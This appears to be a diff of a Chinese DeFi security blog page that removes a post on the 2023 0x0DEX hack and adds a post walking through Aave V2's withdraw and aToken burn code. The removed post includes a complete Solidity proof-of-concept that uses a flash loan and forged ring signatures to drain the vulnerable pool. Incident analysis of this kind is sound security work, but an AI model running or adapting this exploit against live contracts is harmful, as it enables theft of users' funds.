@@ -4,8 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="20230911 0x0DEX, Blog">
-    <meta name="description" content="攻击介绍OxODexPool合约中的swapOnWithdrawal()方法被黑客利用，导致被盗取39.9964Ether(约$61K)。0x0DEX通过deposit()和withdraw()方法使用户能够私下转移资金。0x0DEX后来引">
+    <meta name="keywords" content="Aave V2分析(二), Blog">
+    <meta name="description" content="Aave V2分析(二)书接上文，本篇我们从代码分析Withdrawal的逻辑
+Withdraw  function withdraw(
+    address asset,
+    uint256 amount,
+    address ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>20230911 0x0DEX | Blog</title>
+    <title>Aave V2分析(二) | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -282,12 +286,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">20230911 0x0DEX</h1>
+                    <h1 class="description center-align post-title">Aave V2分析(二)</h1>
                 </div>
             </div>
         </div>
@@ -323,28 +327,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-09-25
+                    2024-03-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-01-17
+                    2024-03-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    457
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    2 分
                 </div>
                 
 
@@ -364,333 +368,96 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>OxODexPool合约中的swapOnWithdrawal()方法被黑客利用，导致被盗取39.9964Ether(约$61K)。<br>0x0DEX通过deposit()和withdraw()方法使用户能够私下转移资金。0x0DEX后来引入了swapOnWithdrawal()方法，它通过允许用户私下交换他们的存款资金（ETH）来扩展协议的功能。这个交换取款功能被利用了。</p>
-<p>TX：0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec</p>
-<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a target="_blank" rel="noopener" href="https://explorer.phalcon.xyz/tx/eth/0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec">phalcon</a>来分析。</p>
-<p>通过phalcon我们很容易发现怪异之处，当攻击者存入10Ether后通过swapOnWithdrawal()取出了价值9.97Ehter的USDC，然后攻击者又存入了0.1Ether，但依然能取出价值9.97Ether的USDC。很明显漏洞就在swapOnWithdrawal()中。</p>
-<pre><code>    function swapOnWithdrawal(
-        address tokenOut,
-        address payable recipient,
-        uint256 relayerGasCharge, 
-        uint256 amountOut,
-        uint256 deadline,
-        WithdrawalData memory withdrawalData
-    ) external {
-        require(recipient != address(0), "ZERO_ADDRESS");
+                <h1 id="Aave-V2分析-二"><a href="#Aave-V2分析-二" class="headerlink" title="Aave V2分析(二)"></a>Aave V2分析(二)</h1><p>书接上文，本篇我们从代码分析Withdrawal的逻辑</p>
+<h2 id="Withdraw"><a href="#Withdraw" class="headerlink" title="Withdraw"></a>Withdraw</h2><pre class=" language-solidity"><code class="language-solidity">  function withdraw(
+    address asset,
+    uint256 amount,
+    address to
+  ) external override whenNotPaused returns (uint256) {
+    DataTypes.ReserveData storage reserve = _reserves[asset];
 
-        withdraw(
-            recipient, 
-            withdrawalData,
-            relayerGasCharge
-        );
+    address aToken = reserve.aTokenAddress;
 
-        uint amountIn = _lastWithdrawal;
-        uint relayerFee = getRelayerFeeForAmount(amountIn);
+    uint256 userBalance = IAToken(aToken).balanceOf(msg.sender);
 
-        address payable relayerAddress = IOxODexFactory(factory).relayerAddress();
-        (bool sent, ) = relayerAddress.call{value: relayerFee}("");
-        require(sent, "FAILED_TO_SEND_RELAYER_FEE");
+    uint256 amountToWithdraw = amount;
 
-        amountIn -= relayerFee;
+    if (amount == type(uint256).max) {
+      amountToWithdraw = userBalance;
+    }
+
+    ValidationLogic.validateWithdraw(
+      asset,
+      amountToWithdraw,
+      userBalance,
+      _reserves,
+      _usersConfig[msg.sender],
+      _reservesList,
+      _reservesCount,
+      _addressesProvider.getPriceOracle()
+    );
+
+    reserve.updateState();
+
+    reserve.updateInterestRates(asset, aToken, 0, amountToWithdraw);
+
+    if (amountToWithdraw == userBalance) {
+      _usersConfig[msg.sender].setUsingAsCollateral(reserve.id, false);
+      emit ReserveUsedAsCollateralDisabled(asset, msg.sender);
+    }
+
+    IAToken(aToken).burn(msg.sender, to, amountToWithdraw, reserve.liquidityIndex);
+
+    emit Withdraw(asset, msg.sender, to, amountToWithdraw);
+
+    return amountToWithdraw;
+  }
 </code></pre>
-<p>通过代码我们能发现发给我们的 amountIn = _lastWithdrawal - relayerFee。_lastWithdrawal在withdraw中被赋值。</p>
-<pre><code>if(withdrawalData.wType == Types.WithdrawalType.Direct){
-            _sendFundsWithRelayerFee(withdrawalData.amount - relayerGasCharge, recipient);
-        }else{
-            _lastWithdrawal = withdrawalData.amount - relayerGasCharge;
-        }
+<p>与Deposit类似，首先获取了存入的资产合约的储备池对象</p>
+<pre class=" language-solidity"><code class="language-solidity">DataTypes.ReserveData storage reserve = _reserves[asset];
 </code></pre>
-<p>很明显_lastWithdrawal并不会再每提款时更新，只在使用WithdrawalType.Swap时更新。思路已经明了。</p>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: SEE LICENSE IN LICENSE
-pragma solidity  ^0.8.10;
+<p>然后验证取款是否合法</p>
+<pre class=" language-solidity"><code class="language-solidity">    ValidationLogic.validateWithdraw(
+      asset,
+      amountToWithdraw,
+      userBalance,
+      _reserves,
+      _usersConfig[msg.sender],
+      _reservesList,
+      _reservesCount,
+      _addressesProvider.getPriceOracle()
+    );
+</code></pre>
+<p>再更新复利序列索引和流动性利率。(由于再Deposit中已经分析了，此处就不赘述了)</p>
+<pre class=" language-solidity"><code class="language-solidity">reserve.updateState();
 
-import "forge-std/Test.sol";
-import "./interface.sol";
+reserve.updateInterestRates(asset, aToken, 0, amountToWithdraw);
+</code></pre>
+<p>最后销毁aToken，返回资产代币给用户。</p>
+<pre class=" language-solidity"><code class="language-solidity">IAToken(aToken).burn(msg.sender, to, amountToWithdraw, reserve.liquidityIndex);
 
-// Attacker : https://etherscan.io/address/0xcf28e9b8aa557616bc24cc9557ffa7fa2c013d53
-// Attacker Contract : https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b
-// Vulnerable Contract : https://etherscan.io/address/0x29d2bcf0d70f95ce16697e645e2b76d218d66109
-// Tx : 0x00b375f8e90fc54c1345b33c686977ebec26877e2c8cac165429927a6c9bdbec
+function burn(
+    address user,
+    address receiverOfUnderlying,
+    uint256 amount,
+    uint256 index
+  ) external override onlyLendingPool {
+    uint256 amountScaled = amount.rayDiv(index);
+    require(amountScaled != 0, Errors.CT_INVALID_BURN_AMOUNT);
+    _burn(user, amountScaled);
 
-library Types {
-    enum WithdrawalType {
-        Direct,
-        Swap
-    }
-}
+    IERC20(_underlyingAsset).safeTransfer(receiverOfUnderlying, amount);
 
-struct WithdrawalData {
-    uint256 amount;
-    uint256 ringIndex;
-    uint256 c0;
-    uint256[2] keyImage;
-    uint256[] s;
-    Types.WithdrawalType wType;
-}
-
-interface IOxODexPool {
-    function deposit(
-        uint256 _amount,
-        uint256[4] memory _publicKey
-    ) external payable;
-
-    function withdraw(
-        address payable recipient,
-        WithdrawalData memory withdrawalData,
-        uint256 relayerGasCharge
-    ) external;
-
-    function swapOnWithdrawal(
-        address tokenOut,
-        address payable recipient,
-        uint256 relayerGasCharge,
-        uint256 amountOut,
-        uint256 deadline,
-        WithdrawalData memory withdrawalData
-    ) external;
-
-    function getCurrentRingIndex(
-        uint256 amountToken
-    ) external view returns (uint256);
-
-    function getRingHash(
-        uint256 _amountToken,
-        uint256 _ringIndex
-    ) external view returns (bytes32);
-}
-
-contract ContractTest is Test {
-    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
-    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-
-    uint256 private constant Bx = 1368015179489954701390400359078579693043519447331113978918064868415326638035;
-    uint256 private constant By = 9918110051302171585080402603319702774565515993150576347155970296011118125764;
-    uint256 private constant Hx = 2286484483920925456308759965850684826720807236777393886284879343816677643124;
-    uint256 private constant Hy = 1804024400776434902361310543986557260474938171670710692674407862657333646188;
-    uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;
-
-    function setUp() public {
-        vm.createSelectFork("mainnet", 18115707);
-        vm.label(address(OxODexPool), "OxODexPool");
-        vm.label(address(WETH), "WETH");
-        vm.label(address(USDC), "USDC");
-        vm.label(address(BalancerVault), "BalancerVault");
-        vm.label(address(Router), "Router");
-    }
-
-    function testExploit() public {
-        deal(address(this), 0 ether);
-        uint256 loan = 11 ether;
-
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(WETH);
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = loan;
-
-        BalancerVault.flashLoan(address(this), tokens, amounts, "");
-        emit log_named_decimal_uint(
-            "Attacker ETH balance after exploit",
-            address(this).balance,
-            18
-        );
-    }
-
-    function receiveFlashLoan(
-        address[] memory,
-        uint256[] memory amounts,
-        uint256[] memory fees,
-        bytes memory
-    ) external payable {
-        
-        WETH.withdraw(amounts[0]);
-        exploit();
-
-        USDC.approve(address(Router), type(uint256).max);
-        address[] memory path = new address[](2);
-        path[0] = address(USDC);
-        path[1] = address(WETH);
-        Router.swapExactTokensForETH(
-            USDC.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
-        WETH.deposit{value: amounts[0] + fees[0]}();
-        WETH.transfer(address(BalancerVault), amounts[0] + fees[0]);
-    }
-
-    function exploit() internal {
-        
-        uint256 poolETHBalance = address(OxODexPool).balance;
-        poolETHBalance =
-            10 ether -
-            (poolETHBalance - (poolETHBalance / 10 ether) * 10 ether);
-        new ForceSend{value: poolETHBalance}();
-
-        WithdrawalData memory w;
-        
-        uint256 ringIndex = deposit(10 ether);
-        w = withdrawData(address(this), 10 ether, ringIndex);
-        w.wType = Types.WithdrawalType.Swap;
-        OxODexPool.swapOnWithdrawal(
-            address(USDC),
-            payable(address(this)),
-            0,
-            0,
-            block.timestamp,
-            w
-        );
-
-        while (address(OxODexPool).balance &gt;= 10 ether) {
-            ringIndex = deposit(0.1 ether);
-            w = withdrawData(address(this), 0.1 ether, ringIndex);
-            
-            OxODexPool.swapOnWithdrawal(
-                address(USDC),
-                payable(address(this)),
-                0,
-                0,
-                block.timestamp,
-                w
-            );
-        }
-    }
-
-    function addFee(uint256 realAmount) internal pure returns (uint256 total) {
-        total = realAmount + (realAmount * 9) / 1000;
-    }
-
-    function deposit(uint256 amount) internal returns (uint256 ringIndex) {
-       
-        uint256[4] memory pks = [0x1, 0x2, Bx, By];
-        ringIndex = OxODexPool.getCurrentRingIndex(amount);
-        OxODexPool.deposit{value: addFee(amount)}(amount, pks);
-    }
-
-    function withdrawData(
-        address recv, 
-        uint256 amount,
-        uint256 ringIndex
-    ) internal view returns (WithdrawalData memory w) {
-        bytes32 ringHash = OxODexPool.getRingHash(amount, ringIndex);
-        uint256[2] memory c;
-        uint256[2] memory s;
-        (c, s) = generateSignature(ringHash, recv);
-
-        w.amount = amount;
-        w.ringIndex = ringIndex;
-        w.c0 = c[0];
-        w.keyImage = [Hx, Hy];
-        w.s = new uint256[](2);
-        w.s[0] = s[0];
-        w.s[1] = s[1];
-       
-    }
-
-   
-    function generateSignature(
-        bytes32 ringHash,
-        address recv
-    ) public view returns (uint256[2] memory c, uint256[2] memory s) {
-        uint256[2] memory G;
-        uint256[2] memory H;
-        uint256[2] memory B;
-        G[0] = 0x1;
-        G[1] = 0x2;
-        H[0] = Hx;
-        H[1] = Hy;
-        B[0] = Bx;
-        B[1] = By;
-
-      
-        c[1] = createHash(ringHash, recv, G, H);
-      
-        s[1] = 1;
-        c[0] = createHash(
-            ringHash,
-            recv,
-            ecAdd(G, ecMul(B, c[1])),
-            ecMul(H, c[1] + 1)
-        );
-       
-        s[0] = curveN + 1 - c[0];
-    }
-
-    
-    function ecAdd(
-        uint256[2] memory p,
-        uint256[2] memory q
-    ) internal view returns (uint256[2] memory r) {
-        assembly {
-            
-            let fp := mload(0x40)
-            mstore(fp, mload(p))
-            mstore(add(fp, 0x20), mload(add(p, 0x20)))
-            mstore(add(fp, 0x40), mload(q))
-            mstore(add(fp, 0x60), mload(add(q, 0x20)))
-            pop(staticcall(gas(), 0x06, fp, 0x80, r, 0x40))
-        }
-    }
-
-    
-    function ecMul(
-        uint256[2] memory p,
-        uint256 k
-    ) internal view returns (uint256[2] memory kP) {
-        assembly {
-            let fp := mload(0x40)
-            mstore(fp, mload(p))
-            mstore(add(fp, 0x20), mload(add(p, 0x20)))
-            mstore(add(fp, 0x40), k)
-            pop(staticcall(gas(), 0x07, fp, 0x60, kP, 0x40))
-        }
-    }
-
-    function createHash(
-        bytes32 ringHash,
-        address recv,
-        uint256[2] memory p1,
-        uint256[2] memory p2
-    ) internal pure returns (uint256 hash) {
-        
-        assembly {
-            let fp := mload(0x40)
-            mstore(fp, 0x1)
-            mstore(add(fp, 0x20), 0x2)
-            mstore(add(fp, 0x40), Bx)
-            mstore(add(fp, 0x60), By)
-            mstore(add(fp, 0x80), Hx)
-            mstore(add(fp, 0xa0), Hy)
-
-            mstore(add(fp, 0xd4), recv)
-            mstore(add(fp, 0xc0), ringHash)
-
-            
-            mstore(add(fp, 0xf4), mload(p1))
-            mstore(add(fp, 0x114), mload(add(p1, 0x20)))
-            mstore(add(fp, 0x134), mload(p2))
-            mstore(add(fp, 0x154), mload(add(p2, 0x20)))
-
-            hash := mod(keccak256(fp, 0x174), curveN)
-        }
-    }
-
-    receive() external payable {}
-}
-
-contract ForceSend {
-    IOxODexPool private constant OxODexPool =
-        IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
-
-    constructor() payable {
-        selfdestruct(payable(address(OxODexPool)));
-    }
+    emit Transfer(user, address(0), amount);
+    emit Burn(user, receiverOfUnderlying, amount, index);
 }
 </code></pre>
+<p>这里唯一要细说的地方是销毁的aToken数目是经过流动性复利因子贴现过的数目。</p>
+<p>同样举个例子：</p>
+<p>客户存入2020年底存入了100 USDC，此时AAVE刚刚开始计息，流动性利率假设一直为10%。</p>
+<p>那么到了2022年，客户的本金和是100<em>1.1</em>1.1=121 USDC = 100 * LiquidityIndex(2)。客户持有的aToken则一直是100</p>
+<p>这里问题来了，客户此时打算全部提取走121 USDC。那么如果销毁121个aToken，这明显是不合适的。aToken作为存款凭证，并不会随着利息的增加而增加，它始终代表的是最初的100个USDC。</p>
+<p>所以此时销毁的aToken数量是 121/LiquidityIndex(2)=100</p>
 
                 
             </div>
@@ -717,7 +484,7 @@ contract ForceSend {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/09/25/20230911-0x0DEX/">https://willcking.github.io/2023/09/25/20230911-0x0DEX/</a>
+                    <a href="https://willcking.github.io/2024/03/21/Aave%20V2%E5%88%86%E6%9E%90(%E4%BA%8C)/">https://willcking.github.io/2024/03/21/Aave%20V2%E5%88%86%E6%9E%90(%E4%BA%8C)/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -831,54 +598,18 @@ contract ForceSend {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/09/26/20230826-SVT/">
+                <a href="/2024/03/21/Aave%20V2%E5%88%86%E6%9E%90(%E4%BA%8C)/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="20230826 SVT">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Aave V2分析(二)">
                         
-                        <span class="card-title">20230826 SVT</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-26
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            潇南笑笑生
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/09/24/20230921-CEXISWAP/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230921 CEXISWAP">
-                        
-                        <span class="card-title">20230921 CEXISWAP</span>
+                        <span class="card-title">Aave V2分析(二)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -889,7 +620,45 @@ contract ForceSend {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            潇南笑笑生
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/03/17/Calldata-%E8%A7%A3%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Calldata 解析">
+                        
+                        <span class="card-title">Calldata 解析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-17
                             </span>
                         <span class="publish-author">
                             
